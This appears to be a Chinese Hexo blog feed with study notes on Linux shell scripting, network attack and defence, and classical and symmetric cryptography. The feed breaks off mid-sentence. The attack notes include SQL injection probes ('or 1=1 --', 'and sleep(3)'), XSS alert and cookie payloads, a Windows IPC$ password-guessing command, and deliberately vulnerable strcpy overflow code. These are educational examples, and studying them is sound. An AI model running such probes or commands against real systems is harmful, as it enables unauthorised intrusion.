.）</li><li>接口概念：在计算机体系结构中，操作系统是最接近硬件的软件部分，其更侧重从软件和功能的角度出发去描述部件，所以称之为<strong>设备控制器</strong>；而在计算机组成原理中，研究的重点在于硬件组成部分，其更青睐于从硬件的角度出发去描述部件，所以称之为<strong>I&#x2F;O接口</strong>。</li></ul></li></ol><h2 id="各类Shell"><a href="#各类Shell" class="headerlink" title="各类Shell"></a>各类Shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $SHELL</span><br><span class="line">echo $0</span><br><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure><ol><li><p>bash</p></li><li><p>zsh</p><ul><li><p>zshell简介：Zsh（Z-shell）是一款用于交互式使用的shell，也可以作为脚本解释器来使用。其包含了 bash，ksh，tcsh 等其他shell中许多优秀功能，也拥有诸多自身特色。</p></li><li><p>zshell发展历史：Zsh初版由原作者保罗·弗斯塔德（Paul Falstad）于1990年在普林斯顿大学求学时编写 [3] 。其名称zsh源于普林斯顿大学助教的邵中（Zhong Shao，现任耶鲁大学教授）——保罗将邵中的用户名”zsh”作为此Shell的名称</p></li><li><p>zsh美化</p><h2 id="SHELL文件类型"><a href="#SHELL文件类型" class="headerlink" title="SHELL文件类型"></a>SHELL文件类型</h2><p>&#x2F; vim test1.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x test1.sh</span><br><span class="line">./test1.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh test1.sh</span><br></pre></td></tr></table></figure><h2 id="SHELL基本操作"><a href="#SHELL基本操作" class="headerlink" title="SHELL基本操作"></a>SHELL基本操作</h2></li></ul></li><li><p>变量赋值调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $0 $1 $2 </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh echotest1.sh 0 1 2 3</span><br><span class="line"><span class="meta">#</span><span class="language-bash">output:0 1 2</span></span><br></pre></td></tr></table></figure></li><li><p>expr：数值计算</p><ul><li><p>“+、-、\、&#x2F;、%”</p></li><li><p>用法：“ $ () ”、“$ []”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">expr 2 + 3</span><br><span class="line"># output：5</span><br></pre></td></tr></table></figure></li></ul></li><li><p>shell脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">touch test1</span><br><span class="line">mkdir test1</span><br><span class="line">mv test1 /test1</span><br></pre></td></tr></table></figure><ol><li><p>判断语法（a[]、test ?）</p><ol><li><p>文件类判断</p><ul><li>-e filename #如果 filename为目录，则为真</li><li>-f filename #如果 filename为常规文件，则为真</li><li>-L filename #如果 filename为符号链接，则为真</li><li>-r filename #如果 filename可读，则为真</li><li>-w filename #如果 filename可写，则为真</li><li>-x filename #如果 filename可执行，则为真</li><li>-s filename #如果文件长度不为0，则为真</li><li>-h filename #如果文件是软链接，则为真</li></ul></li><li><p>数值比较判断</p><ul><li>-eq：等于为真</li><li>-ne：不等于为真</li><li>-lt：小于为真</li><li>-le：小于等于为真</li><li>-gt：大于为真</li><li>-ge：大于等于为真</li></ul></li><li><p>字符串判断</p><ul><li>str：str非空，真</li><li>s1 &#x3D; s2</li><li>s1 !&#x3D; s2</li><li>-n str：str不为0，真</li><li>-z str：str为0，真</li></ul></li><li><p>组合语法</p><ul><li>！：逻辑非</li><li>-a：逻辑与</li><li>-o：逻辑或</li><li>(  )：表达式分组，优先级区分</li></ul></li></ol><ul><li><p>#如果&#x3D;&#x3D;文件夹&#x3D;&#x3D;不存在，则创建文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tempPath=&quot;/home/parasaga/blank&quot;</span><br><span class="line">if [ ! -d &quot;$tempPath&quot; ]; </span><br><span class="line">then mkdir $blankPath</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li><li><p>#如果&#x3D;&#x3D;文件&#x3D;&#x3D;不存在，则创建文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tempFile=&quot;/home/parasaga/blank/error.log&quot;</span><br><span class="line">if [ ! -f &quot;$tempFile&quot; ]; </span><br><span class="line">then touch $tempFile</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -f test1 ]</span><br><span class="line">then echo &quot;flase&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;true&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li><li><p>演示示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">read s1</span><br><span class="line">if [ $s1 == 1 ]</span><br><span class="line">then echo 123</span><br><span class="line">mkdir shell1</span><br><span class="line">elif [ $s1 == 2 ]</span><br><span class="line">then echo 321</span><br><span class="line">        mkdir shell2</span><br><span class="line">else</span><br><span class="line">        echo finding</span><br><span class="line">if [  -d shell1 ]</span><br><span class="line">then    rm -r shell1</span><br><span class="line">        echo ok1</span><br><span class="line">fi</span><br><span class="line">if [  -d shell2 ]</span><br><span class="line">then rm -r shell2</span><br><span class="line">        echo ok2</span><br><span class="line">else</span><br><span class="line">        echo false</span><br><span class="line">fi</span><br><span class="line">fi       </span><br></pre></td></tr></table></figure></li></ul></li><li><p>函数定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">functionname</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function getSum()&#123;</span><br><span class="line">SUM=$[$n1+$n2]</span><br><span class="line">echo &quot;sum=$SUM&quot;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">read -p &quot;请输入第一个参数n1：&quot; n1</span><br><span class="line">read -p &quot;请输入第二个参数n2：&quot; n2</span><br><span class="line"></span><br><span class="line"># 调用 getSum 函数</span><br><span class="line">getSum $n1 $n2</span><br></pre></td></tr></table></figure></li><li><p>循环语句</p><ul><li><p>while</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while 条件（为真时执行）</span><br><span class="line">do</span><br><span class="line">    语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>until：测试发生在循环末尾，因此循环至少<strong>执行一次</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until 条件</span><br><span class="line">do</span><br><span class="line">    语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>for</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量名 [ in 数值列表 ]</span><br><span class="line">do</span><br><span class="line">    语句</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>exit 0</p></li></ul></li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux系统基础&quot;&gt;&lt;a href=&quot;#Linux系统基础&quot; class=&quot;headerlink&quot; title=&quot;Linux系统基础&quot;&gt;&lt;/a&gt;Linux系统基础&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;MBR：主引导记录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;grub2引</summary>
      
    
    
    
    <category term="开源项目" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
    <category term="OS" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/OS/"/>
    
    
    <category term="linux" scheme="https://dxhm.github.io/tags/linux/"/>
    
    <category term="操作系统" scheme="https://dxhm.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防技术</title>
    <link href="https://dxhm.github.io/2022/03/22/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    <id>https://dxhm.github.io/2022/03/22/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/</id>
    <published>2022-03-22T08:01:54.000Z</published>
    <updated>2023-01-07T18:09:12.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h1 id="三、口令攻击"><a href="#三、口令攻击" class="headerlink" title="三、口令攻击"></a>三、口令攻击</h1><ol><li><h2 id="针对口令强度的攻击（弱口令攻击）"><a href="#针对口令强度的攻击（弱口令攻击）" class="headerlink" title="针对口令强度的攻击（弱口令攻击）"></a>针对口令强度的攻击（弱口令攻击）</h2><ol><li>穷举法（暴破）</li><li>字典攻击</li><li>社工<ol start="4"><li>组合攻击</li><li>撞库攻击</li></ol></li><li>彩虹表破解：破解哈希算法（主用于MD5、HASH等）<ul><li>原理：基于内存 - 时间衡量方法，通过以一定存储空间换取时间的方式，提高对散列值的破解效率</li></ul></li></ol><ul><li>windows远程口令猜解<ol><li>基于IPC的远程口令猜解（IPC$文件和打印机共享：139、445） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标主机IP\ipc$ &quot;口令&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure></li><li>基于Thrminal Service的远程口令猜解（DRP服务：3389）</li></ol></li></ul></li><li><h2 id="针对口令存储的攻击"><a href="#针对口令存储的攻击" class="headerlink" title="针对口令存储的攻击"></a>针对口令存储的攻击</h2><ol><li>缓存口令<ul><li>实现原理：在进行用户身份验证时，需要将口令配置加载到<strong>内存</strong>中，通过对内存读取</li><li>相关工具：PWDump、Mimikatz</li></ul></li><li>口令文件<ul><li>口令通过文件形式进行存放在系统中，对文件进行破解</li><li>相关实例：<ol><li>windows账号和口令存放在SAM文件（C:\Windows\System32\config）</li><li>Linux账号和口令存放在Shadow文件</li></ol></li></ul></li><li>口令的其他存储位置<ul><li>（除了缓存和文件）存放其他位置：注册表、（及时口令）casch或内存、硬盘扇区、（主板BIOS存放位置）COMS</li></ul></li></ol><ul><li>NTLM加密机制：<ol><li>口令转换成Unicode编码</li><li>MD算法对Unicode编码进行散列，得到128比特的散列结果，成为NTLM散列</li></ol><ul><li>CR方式：“挑战&#x2F;响应”方式（服务器对挑战数据没有时效性要求，可以进行重放攻击）</li></ul></li></ul></li><li><h2 id="针对口令传输的攻击"><a href="#针对口令传输的攻击" class="headerlink" title="针对口令传输的攻击"></a>针对口令传输的攻击</h2><ol><li>口令嗅探</li><li>键盘记录</li><li>网络钓鱼</li><li>重放攻击：（通信双方按照特定协议）嗅探当前通信流量，在适当的时候重发给通信的其中一方，达到欺骗目的。<ol><li>简单重放</li><li>反向重放：向消息发送者重放数据</li></ol><ul><li>SMB协议（共享文件、打印机、通信对象之间资源）发展：明文 &#x3D;&#x3D;&gt; LM验证机制（LAN Manager Callenge Response） &#x3D;&#x3D;&gt; NTLM验证机制（Windows NT Challenge Response）<h1 id="四、软件漏洞"><a href="#四、软件漏洞" class="headerlink" title="四、软件漏洞"></a>四、软件漏洞</h1></li></ul></li></ol></li><li><h2 id="漏洞标准化研究"><a href="#漏洞标准化研究" class="headerlink" title="漏洞标准化研究"></a>漏洞标准化研究</h2><ol><li>CVE：Common Vulnerabilities &amp; Exposures<ul><li>漏洞字典：漏洞对应CVE编号</li></ul></li><li>CWE：Common Weakness Enumeration<ul><li>CWE是一种包括类缺陷、基础缺陷、变种缺陷等多层次的体系<ol><li>字典视图：以字母表顺序排列</li><li>开发视图：针对软件开发者，以软件开发周期为参照分类</li><li>研究视图：这对学术界人士，从内在性质等方面分类</li></ol></li></ul></li></ol></li><li><h2 id="典型漏洞类型"><a href="#典型漏洞类型" class="headerlink" title="典型漏洞类型"></a>典型漏洞类型</h2><ol><li>栈溢出<ul><li>1986年首次出现真实攻击</li><li>进程使用系统内存从低到高四结构：栈、堆、数据段、文本（代码）段</li><li>栈空间是程序设计时规定好如何使用以及使用多少的内存空间（典型栈变量包括函数内部的普通变量、数组等）</li><li>栈帧（stack Frame）：每个进程有一个栈，这个进程中每个函数被调用时分别再栈中占用一段区域</li><li>原理分析示例  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(name,argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,name);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li>堆溢出<ul><li>堆结构特点<ol><li>堆是程序运行时动态分配的内存（指不预先决定，需要参考用户反馈）</li><li>堆使用时需要程序员使用专用函数申请（如：C：malloc() ; C++：new()）</li><li>一般一个堆指针来使用申请的内存，读写释放都通过这个指针完成</li><li>使用完毕后要通过释放函数回收内存，否则会造成内存泄漏（free() ; delete() ）</li></ol></li><li>现代操作系统的堆结构：<ol><li>堆块：堆区内存按不同大小组织成块，以堆块为单元进行标识，而不是传统字节标识<ul><li>块首：一个堆块头部的几个字节，用来标识这个块首自身信息。</li><li>块身：紧跟在块首后面部分，最终分配给用户使用的数据区。</li></ul></li><li>堆表：一般位于堆区起始位置，用于检索堆区中所有堆块的重要信息，包括堆块的位置、大小、空闲或占用等。</li></ol></li><li>原理分析示例：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFSIZE 32</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *buf1;</span><br><span class="line">buf1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(BUFFSIZE);<span class="comment">//分配内存块</span></span><br><span class="line"><span class="built_in">strcpy</span>(buf1,argv[<span class="number">1</span>]);<span class="comment">//向buf1拷贝参数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf1);<span class="comment">//打印buf1</span></span><br><span class="line"><span class="built_in">free</span>(buf1);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>堆溢出攻击思路<ol><li>构造数据溢出下一个堆块的块首</li><li>改写块首的前向指针和后向指针</li><li>分配、释放、合并等操作发生时获得一次向内存任意地址读写任意数据的机会</li></ol></li></ul></li><li>格式化串漏洞<ul><li>格式化串：在print系列函数中按照一定的格式对数据进行输出（既可输出到标准输出，也可输出到文件句柄、字符串等）</li><li>格式化串漏洞原理：软件使用格式化字符串为参数，且该格式化字符串来自外部输入<ul><li>输入格式化字符串参数”%n”：『将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置』</li><li>“%p”</li></ul></li><li>优势：只要构造出指针就可以修盖内存中任何数值，攻击具有针对性。（栈溢出：地毯式轰炸）</li></ul></li><li>整型溢出<ol><li>存储溢出</li><li>运算溢出</li><li>符号溢出</li></ol></li><li>（UAF）释放再使用</li></ol></li><li><h2 id="溢出漏洞利用原理"><a href="#溢出漏洞利用原理" class="headerlink" title="溢出漏洞利用原理"></a>溢出漏洞利用原理</h2></li><li><h2 id="漏洞利用保护机制"><a href="#漏洞利用保护机制" class="headerlink" title="漏洞利用保护机制"></a>漏洞利用保护机制</h2><h1 id="五、Web应用攻击"><a href="#五、Web应用攻击" class="headerlink" title="五、Web应用攻击"></a>五、Web应用攻击</h1><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;err&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li>主要类型<ol><li>反射型【非持久】：输入攻击脚本直接返回到被攻击者浏览器 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.example.com/test.php? </span></span><br><span class="line">user=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;123&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="comment">//通过传递变量缺乏过滤进行执行</span></span><br></pre></td></tr></table></figure></li><li>存储型【持久】：（一般用于论坛留言，评论，日志）将攻击脚本存储于服务器，受害者查看页面时执行</li><li>DOM型（文档对象模型）：针对web中的JavaScript代码的逻辑漏洞而执行攻击脚本</li></ol></li><li>常用利用方法<ol><li>Cookie窃取 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;<span class="regexp">/script&gt;/</span><span class="regexp">/visit:document.cookie to GetCookie</span></span><br></pre></td></tr></table></figure></li><li>会话劫持</li><li>钓鱼：通过执行JavaScript代码动态生成页面内容或直接注入HTML代码（比传统钓鱼更具隐蔽性）</li><li>信息刺探：访问并窃取历史信息、端口信息、剪切板、IP、键盘信息等request对象</li><li>网页挂马</li><li>xss蠕虫：一般用存储型将恶意代码保存于服务器<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2></li></ol></li><li>注入条件：<ul><li>用户能够控制输入</li><li>原本程序要执行的sql语句，拼接了用户输入数据</li></ul></li><li>常用SQL注入<ol><li>Mysql <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 where 条件 order by i limit m.n /*select一般语句*/</span><br></pre></td></tr></table></figure></li><li>php程序调用函数执行sql语句功能 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx? id=&quot;select * from users where id=$id and pass=&#x27;&quot;.$pass.&quot;&#x27;&quot;; &amp;pwd=</span><br></pre></td></tr></table></figure></li></ol></li><li>注入类型分类<ol><li>按注入点类型<ol><li>数字型（整型）<ul><li>注入点类型为数字（整型），不需要使用引号闭合 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;9 or 1=1 --&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li>字符型<ul><li>一般需要使用引号（单、双）满足sql语句引号闭合语法要求  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;xx&#x27; or 1=1 --&quot;  --&quot;xx&quot;：任意值 ; &quot;--&quot;：注释符</span><br></pre></td></tr></table></figure></li></ul></li><li>搜索型</li></ol></li><li>按注入技术（执行效果）分类<ol><li>基于布尔的盲注<ul><li>在输入值后拼接布尔表达式（真值为0或1），通过<strong>回显信息的不同</strong>判断，某个参数是否为注入点 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*1=1:真值为true*/</span><br><span class="line">id = 3005 and 1=1 &amp; pass= test</span><br><span class="line">/*1=2:真值为false*/</span><br><span class="line">id = 3005 and 1=2 &amp; pass= test</span><br><span class="line">/*若回显信息不同，则$id为注入点*/</span><br></pre></td></tr></table></figure></li></ul></li><li>基于时间的盲注<ul><li>使用一些时间函数，如延迟函数slee() <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=3005 and sleep(3) &amp;pass=test</span><br><span class="line">/* web应用延迟3秒后显示登录失败，则$id注入点 */</span><br></pre></td></tr></table></figure></li></ul></li><li>基于报错的注入<ul><li>在php调用函数<code>？</code>后输入错误验证传递，观察错误信息中显示出的对应数据库函数，可判断数据库类型</li></ul></li><li>联合查询注入</li><li>堆查询注入</li></ol></li></ol></li><li>常用判断&#x2F;查找注入点<ol><li>经典：<ul><li>and 1&#x3D;1 </li><li>and 2&gt;1 </li><li>or 1&#x3D;1 </li><li>or 1&lt;1</li></ul></li><li>数据库函数：<ul><li>and sleep(4)&#x3D;1 </li><li>and length(user())&gt;3</li></ul></li><li>特殊符号：<ul><li>单引号（’）</li><li>双引号（”）<h1 id="六、恶意代码"><a href="#六、恶意代码" class="headerlink" title="六、恶意代码"></a>六、恶意代码</h1><h1 id="七、假消息攻击"><a href="#七、假消息攻击" class="headerlink" title="七、假消息攻击"></a>七、假消息攻击</h1><h1 id="八、拒绝服务攻击"><a href="#八、拒绝服务攻击" class="headerlink" title="八、拒绝服务攻击"></a>八、拒绝服务攻击</h1><h1 id="九、防御"><a href="#九、防御" class="headerlink" title="九、防御"></a>九、防御</h1><h1 id="十、访问控制机制"><a href="#十、访问控制机制" class="headerlink" title="十、访问控制机制"></a>十、访问控制机制</h1><h1 id="十一、防火墙"><a href="#十一、防火墙" class="headerlink" title="十一、防火墙"></a>十一、防火墙</h1><h1 id="十二、网络安全监控"><a href="#十二、网络安全监控" class="headerlink" title="十二、网络安全监控"></a>十二、网络安全监控</h1><h1 id="十三、追踪溯源"><a href="#十三、追踪溯源" class="headerlink" title="十三、追踪溯源"></a>十三、追踪溯源</h1></li></ul></li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;h1 id=&quot;二、信息收集&quot;&gt;&lt;a href=&quot;#二、信息收集&quot; class=&quot;headerlink&quot; title=&quot;二、信息收</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络空间安全" scheme="https://dxhm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息安全技术</title>
    <link href="https://dxhm.github.io/2022/03/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    <id>https://dxhm.github.io/2022/03/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</id>
    <published>2022-03-22T08:00:46.000Z</published>
    <updated>2023-01-07T18:09:12.634Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、信息安全概述"><a href="#一、信息安全概述" class="headerlink" title="一、信息安全概述"></a>一、信息安全概述</h1><h1 id="二、加密技术"><a href="#二、加密技术" class="headerlink" title="二、加密技术"></a>二、加密技术</h1><ol><li><h2 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h2><ol><li>手工加密阶段</li><li>机械加密阶段</li><li>计算机加密阶段</li></ol></li><li><h2 id="密码学基本概念-amp-术语"><a href="#密码学基本概念-amp-术语" class="headerlink" title="密码学基本概念 &amp; 术语"></a>密码学基本概念 &amp; 术语</h2><ol><li>密码学分支：密码编码学（加密）、密码分析学（解密）</li><li><font color=purple>密码体制：{Sm、Sc、Sk、E、D}<ol><li>S<del>M</del>：明文</li><li>S<del>c</del>：密文</li><li>S<del>k</del>：密钥key</li><li>E：加密算法</li><li>D：解密算法    </font></li></ol></li><li><font color=green>【密码算法安全评估原则】</font>柯克霍夫原则（Kerckhoffs）：密码系统的安全性取决于&#x3D;&#x3D;密钥&#x3D;&#x3D;，而不是密码算法，即密码算法要公开</li></ol></li><li><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><ol><li>移位密码（典型：凯撒密码）<ul><li>设26字母按0，1，2，……，25<ol><li>加密：c &#x3D; m + k (mod 26) </li><li>解密：m &#x3D; c -k (mod 26)</li></ol></li><li>数学形式化定义：略</li></ul></li><li>仿射密码：明文、密文、移位空间相同<ol><li>加密：c &#x3D; (a*m + b) (mod 26)</li><li>解密：m &#x3D; a^-1^ (c - b)  (mod 26)</li></ol></li><li>维吉利亚密码（Vigenere）【简单多表代换密码，使用一系列不同的凯撒密码组成密码字母表】<ul><li>把英文字母用数字代替进行运算，a<del>z 为 0</del>25</li><li>引入了密钥的概念，设定一个参数n，按n个字母一组进行变换</li><li>加解密步骤：<ol><li>分：按照密钥长度对密文进行分组</li><li>转：a<del>z 转换为 0</del>25</li><li>算：(m+k) mod26  &#x2F;    (c-k) mod 26</li><li>转：c &#x2F; m 转回英文</li></ol></li></ul><ol><li>加密：c &#x3D;(m + k) (mod 26)【密文 &#x3D; （明文 + 密钥）mod 26】</li><li>解密：m &#x3D;(c - k) (mod 26)【明文 &#x3D; （密文 - 密钥）mod 26】</li></ol></li><li>置换密码：将明文中各字符的&#x3D;&#x3D;位置次序重新排列&#x3D;&#x3D;得到密文</li></ol><ul><li>古典密码不适合柯克霍夫原则，密码安全性基于算法的保密（现代密码学从1949年开始，由于计算机的出现算法的计算变得非常复杂，保密性不再依赖算法，而是密钥）</li></ul></li><li><h2 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h2><ul><li>加解密算法互为逆运算，密钥相同，满足：M &#x3D; D<del>k</del>( C) &#x3D; D<del>k</del>(E<del>k</del>(M))</li></ul><ol><li>序列密码：将明文划分成单个位（字节）作为加密单位产生明文序列，然后将其与密钥流序列逐位进行模2加运算，符号⊕（异或）<ul><li>分类：<ol><li>同步序列密码：要求发生方和接受方同步，在同样的位置用同样的密钥才保证成功</li><li>自同步序列密码：密钥的产生与密钥和已产生的固定数量的密文位有关</li></ol></li><li>安全性：安全强度依赖于密钥流产生器所产生的密钥流序列的特性，关键是密钥生成器的设计及收发两端密钥流产生的同步技术</li><li>实现要求：<ol><li>伪随机序列：（良好密钥流序列：良好的伪随机性）<ol><li>自然现象产生随机</li><li>使用软件以简单数学函数实现（如：线性同余法，线性反馈移位寄存器，非线性反馈移位寄存器，有限自动机和混沌密码）</li></ol></li><li>线性反馈偏移寄存器</li><li>RC4：（一种可变密钥长度、面向字节流的序列密码）以一个数据表为基础，对表进行非线性变换，从而产生密码流序列。<ol><li>密钥调度算法（KSA, Key-Scheduling Algorithm）：将一个随机密钥（大小为40~256位）变换成一个初始置换表S</li><li>伪随机生成算法（PRGA, Pseudo Random Generation 